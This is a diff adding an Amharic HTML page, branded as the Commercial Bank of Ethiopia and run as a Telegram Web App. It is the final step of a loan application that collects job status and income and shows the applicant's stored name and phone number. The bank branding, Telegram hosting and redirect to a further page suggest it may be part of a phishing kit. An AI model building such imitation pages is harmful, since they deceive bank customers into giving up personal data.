@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>የኢትዮጵያ ንግድ ባንክ - ማጠቃለያ</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --cbe-purple: #51255e; --bg-color: #ffffff; --card-bg: #ffffff; --text-main: #111111; --text-muted: #666666; --border-color: #dddddd; --btn-gray: #f2f2f2; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .app-header { width: 100%; background-color: #ffffff; border-bottom: 1px solid var(--border-color); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+        .back-btn-top { color: var(--cbe-purple); text-decoration: none; font-weight: 700; font-size: 14px; cursor: pointer; }
+        .header-title { font-size: 18px; font-weight: 800; color: var(--cbe-purple); }
+        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 30px 24px; border-radius: 16px; border: 1px solid var(--border-color); display: flex; flex-direction: column; }
+        .main-title { font-size: 24px; color: var(--text-main); margin: 0 0 6px; text-align: center; font-weight: 800; }
+        .subtext { font-size: 13.5px; color: var(--text-muted); text-align: center; margin-bottom: 20px; }
+        .step-indicator { display: flex; gap: 8px; margin: 0 auto 28px; width: 80%; }
+        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
+        .step-bar.active { background-color: var(--cbe-purple); }
+        .form-group { margin-bottom: 20px; display: flex; flex-direction: column; }
+        .form-group label { font-size: 14px; font-weight: 700; color: #222; margin-bottom: 8px; }
+        .form-control { font-size: 14px; padding: 14px 16px; border: 1px solid var(--border-color); border-radius: 10px; background-color: #fff; color: #333; outline: none; width: 100%; }
+        .form-control:focus { border-color: var(--cbe-purple); }
+        select.form-control { appearance: none; background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23555' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e"); background-repeat: no-repeat; background-position: right 16px center; background-size: 14px; padding-right: 40px; cursor: pointer; }
+        .summary-card { background-color: #fcfcfc; border: 1px solid var(--border-color); border-left: 4px solid var(--cbe-purple); padding: 16px; border-radius: 10px; margin-bottom: 20px; }
+        .summary-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; font-size: 13px; }
+        .summary-label { color: #666; font-weight: 600; }
+        .summary-value { color: #111; font-weight: 700; }
+        .btn-container { display: flex; flex-direction: column; gap: 10px; }
+        .btn-prev { background-color: var(--btn-gray); color: #444; border: none; width: 100%; padding: 14px; border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
+        .btn-next { background-color: var(--cbe-purple); color: white; border: none; width: 100%; padding: 14px; border-radius: 10px; font-size: 14px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
+        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666; margin-top: auto; border-top: 1px solid var(--border-color); }
+    </style>
+</head>
+<body>
+<div class="app-header">
+    <a onclick="window.location.href='/page3'" class="back-btn-top">← ተመለስ</a>
+    <div class="header-title">የኢትዮጵያ ንግድ ባንክ</div>
+    <div style="width: 30px;"></div>
+</div>
+<div class="card">
+    <h1 class="main-title">የማመልከቻ ማጠቃለያ</h1>
+    <div class="subtext">ደረጃ 3 ከ 3</div>
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+    </div>
+    <form id="step3Form" onsubmit="submitForm(event)">
+        <div class="form-group">
+            <label for="jobStatus">የሥራ ሁኔታ</label>
+            <select id="jobStatus" class="form-control" required>
+                <option value="መንግሥት ሠራተኛ" selected>መንግሥት ሠራተኛ</option>
+                <option value="የግል ድርጅት ሠራተኛ">የግል ድርጅት ሠራተኛ</option>
+                <option value="ነጋዴ / ስራ ፈጣሪ">ነጋዴ / ስራ ፈጣሪ</option>
+            </select>
+        </div>
+        <div class="form-group"><label for="income">ወርሃዊ ገቢ (ብር)</label><input type="number" id="income" class="form-control" placeholder="ምሳሌ: 25000" required></div>
+        <div class="summary-card">
+            <div style="font-weight: 800; color: var(--cbe-purple); margin-bottom: 10px; font-size: 14px;">የጥያቄው ዝርዝር</div>
+            <div class="summary-row"><span class="summary-label">የብድር መጠን:</span><span class="summary-value" id="sumAmount">--</span></div>
+            <div class="summary-row"><span class="summary-label">የቆይታ ጊዜ:</span><span class="summary-value" id="sumDuration">--</span></div>
+            <div class="summary-row"><span class="summary-label">ስም:</span><span class="summary-value" id="sumName">--</span></div>
+            <div class="summary-row"><span class="summary-label">ስልክ ቁጥር:</span><span class="summary-value" id="sumPhone">--</span></div>
+        </div>
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="window.location.href='/page3'">ቀድመው ወደነበሩበት</button>
+            <button type="submit" class="btn-next">ማመልከቻውን ላክ</button>
+        </div>
+    </form>
+</div>
+<div class="footer-banner">© 2026 የኢትዮጵያ ንግድ ባንክ</div>
+<script>
+window.onload = () => {
+    if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
+    document.getElementById('sumAmount').innerText = Number(localStorage.getItem('loan_amount') || "100000").toLocaleString('en-US') + " ብር";
+    document.getElementById('sumDuration').innerText = (localStorage.getItem('loan_term') || "12") + " ወራት";
+    document.getElementById('sumName').innerText = `${localStorage.getItem('firstName') || ""} ${localStorage.getItem('lastName') || ""}`.trim() || "--";
+    document.getElementById('sumPhone').innerText = localStorage.getItem('phone') ? `+251 ${localStorage.getItem('phone')}` : "--";
+};
+function submitForm(event) {
+    event.preventDefault();
+    if (!document.getElementById('income').value.trim()) { alert("እባክዎ ወርሃዊ ገቢዎን ያስገቡ።"); return; }
+    localStorage.setItem('jobStatus', document.getElementById('jobStatus').value);
+    localStorage.setItem('income', document.getElementById('income').value.trim());
+    window.location.href = "/page5";
+}
+</script>
+</body>
+</html>
